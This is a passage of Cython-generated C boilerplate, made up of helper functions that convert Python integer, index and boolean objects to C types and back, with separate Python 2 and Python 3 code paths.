            Py_DECREF(result);
            return NULL;
        }
        return result;
    }
#endif
    PyErr_Format(PyExc_TypeError,
                 "__%.4s__ returned non-%.4s (type %.200s)",
                 type_name, type_name, Py_TYPE(result)->tp_name);
    Py_DECREF(result);
    return NULL;
}
static CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x) {
#if CYTHON_USE_TYPE_SLOTS
  PyNumberMethods *m;
#endif
  const char *name = NULL;
  PyObject *res = NULL;
#if PY_MAJOR_VERSION < 3
  if (likely(PyInt_Check(x) || PyLong_Check(x)))
#else
  if (likely(PyLong_Check(x)))
#endif
    return __Pyx_NewRef(x);
#if CYTHON_USE_TYPE_SLOTS
  m = Py_TYPE(x)->tp_as_number;
  #if PY_MAJOR_VERSION < 3
  if (m && m->nb_int) {
    name = "int";
    res = m->nb_int(x);
  }
  else if (m && m->nb_long) {
    name = "long";
    res = m->nb_long(x);
  }
  #else
  if (likely(m && m->nb_int)) {
    name = "int";
    res = m->nb_int(x);
  }
  #endif
#else
  if (!PyBytes_CheckExact(x) && !PyUnicode_CheckExact(x)) {
    res = PyNumber_Int(x);
  }
#endif
  if (likely(res)) {
#if PY_MAJOR_VERSION < 3
    if (unlikely(!PyInt_Check(res) && !PyLong_Check(res))) {
#else
    if (unlikely(!PyLong_CheckExact(res))) {
#endif
        return __Pyx_PyNumber_IntOrLongWrongResultType(res, name);
    }
  }
  else if (!PyErr_Occurred()) {
    PyErr_SetString(PyExc_TypeError,
                    "an integer is required");
  }
  return res;
}
static CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject* b) {
  Py_ssize_t ival;
  PyObject *x;
#if PY_MAJOR_VERSION < 3
  if (likely(PyInt_CheckExact(b))) {
    if (sizeof(Py_ssize_t) >= sizeof(long))
        return PyInt_AS_LONG(b);
    else
        return PyInt_AsSsize_t(b);
  }
#endif
  if (likely(PyLong_CheckExact(b))) {
    #if CYTHON_USE_PYLONG_INTERNALS
    const digit* digits = ((PyLongObject*)b)->ob_digit;
    const Py_ssize_t size = Py_SIZE(b);
    if (likely(__Pyx_sst_abs(size) <= 1)) {
        ival = likely(size) ? digits[0] : 0;
        if (size == -1) ival = -ival;
        return ival;
    } else {
      switch (size) {
         case 2:
           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -2:
           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case 3:
           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -3:
           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case 4:
           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -4:
           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
      }
    }
    #endif
    return PyLong_AsSsize_t(b);
  }
  x = PyNumber_Index(b);
  if (!x) return -1;
  ival = PyInt_AsSsize_t(x);
  Py_DECREF(x);
  return ival;
}
static CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject* o) {
  if (sizeof(Py_hash_t) == sizeof(Py_ssize_t)) {
    return (Py_hash_t) __Pyx_PyIndex_AsSsize_t(o);
#if PY_MAJOR_VERSION < 3
  } else if (likely(PyInt_CheckExact(o))) {
    return PyInt_AS_LONG(o);
#endif
  } else {
    Py_ssize_t ival;
    PyObject *x;
    x = PyNumber_Index(o);
    if (!x) return -1;
    ival = PyInt_AsLong(x);
    Py_DECREF(x);
    return ival;
  }
}
static CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b) {
  return b ? __Pyx_NewRef(Py_True) : __Pyx_NewRef(Py_False);
}
static CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t ival) {
    return PyInt_FromSize_t(ival);
}


#endif /* Py_PYTHON_H */
